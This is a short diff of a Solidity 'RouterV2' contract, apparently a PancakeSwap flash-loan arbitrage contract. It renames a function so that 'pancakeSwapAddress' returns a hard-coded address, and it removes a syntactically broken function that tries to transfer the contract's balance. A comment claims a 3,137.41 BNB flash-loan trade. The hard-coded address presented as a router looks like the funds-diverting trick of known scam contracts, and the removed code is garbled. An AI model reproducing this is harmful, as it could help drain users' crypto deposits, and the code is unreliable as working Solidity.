@@ -112,7 +112,7 @@ interface IPancakePair {
 
 contract RouterV2 {
 
-    function pancakeRouterV2Address() public pure returns (address) {
+    function pancakeSwapAddress() public pure returns (address) {
         return 0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F;
     }
 
@@ -124,9 +124,7 @@ contract RouterV2 {
             keccak256(abi.encodePacked((b))));
     }
 
-function pancakeSwapAddress() public pure returns {
-return(router.pancakeSwapAddress()).transfer(address(this)balance;
-}
+
     //1. A flash loan borrowed 3,137.41 BNB from Multiplier-Finance to make an arbitrage trade on the AMM DEX PancakeSwap.
     function borrowFlashloanFromMultiplier(
         address add0,
